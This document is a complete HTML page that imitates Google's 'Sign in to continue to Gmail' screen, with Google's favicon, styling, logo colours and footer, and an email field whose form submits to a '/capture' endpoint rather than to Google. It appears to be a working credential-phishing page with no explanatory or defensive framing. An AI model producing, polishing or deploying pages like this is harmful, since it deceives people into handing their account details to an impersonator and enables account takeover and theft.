<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', 'Open Sans', sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        
        .card {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 75px; height: 24px; }
        
        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #5f6368;
            font-size: 16px;
            text-align: center;
            margin-bottom: 32px;
        }
        
        .input-wrapper { margin-bottom: 24px; }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.2s;
        }
        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        
        .forgot {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .forgot:hover { text-decoration: underline; }
        
        .guest { color: #5f6368; font-size: 14px; margin: 40px 0; line-height: 1.5; }
        .guest a { color: #1a73e8; text-decoration: none; }
        
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        
        .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
        
        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover { background: #1557b0; }
        
        footer {
            padding: 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }
        
        .lang-select {
            border: none;
            color: #5f6368;
            font-size: 12px;
            background: transparent;
            cursor: pointer;
        }
        
        .footer-links a {
            color: #757575;
            text-decoration: none;
            margin-left: 24px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M74.6 12.3c0-.8-.1-1.6-.2-2.4H68v4.6h3.7c-.1.9-.6 1.8-1.4 2.3v2h2.3c1.3-1.3 2-3 2-5.5z" fill="#4285F4"/>
                    <path d="M68 22c2.4 0 4.5-.8 6-2.2l-2.3-2c-.8.6-1.9.9-3.7.9-2.9 0-5.3-1.9-6.2-4.6h-2.4v2C62.7 19.8 65.1 22 68 22z" fill="#34A853"/>
                    <path d="M61.8 13.9c-.2-.6-.3-1.3-.3-2s.1-1.4.3-2v-2h-2.4c-.5 1.2-.8 2.5-.8 4s.3 2.8.8 4h2.4v-2z" fill="#FBBC05"/>
                    <path d="M68 5.8c1.6 0 2.8.6 3.8 1.5l2.6-2.6C73.1 2.7 70.8 1.8 68 1.8c-2.9 0-5.5 1.8-7 4.4l2.4 2C62.7 7.7 65.1 5.8 68 5.8z" fill="#EA4335"/>
                </svg>
            </div>
            
            <h1>Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            
            <form action="/capture" method="POST">
                <div class="input-wrapper">
                    <input type="email" name="email" placeholder="Email or phone" required>
                </div>
                
                <a href="#" class="forgot">Forgot email?</a>
                
                <div class="guest">
                    Not your computer? Use a private browsing window to sign in. 
                    <a href="#">Learn more about using Guest mode</a>
                </div>
                
                <div class="actions">
                    <a href="#" class="create">Create account</a>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>
    </div>
    
    <footer>
        <select class="lang-select">
            <option>English (United States)</option>
            <option>Hindi</option>
            <option>Spanish</option>
        </select>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>
</body>
</html>
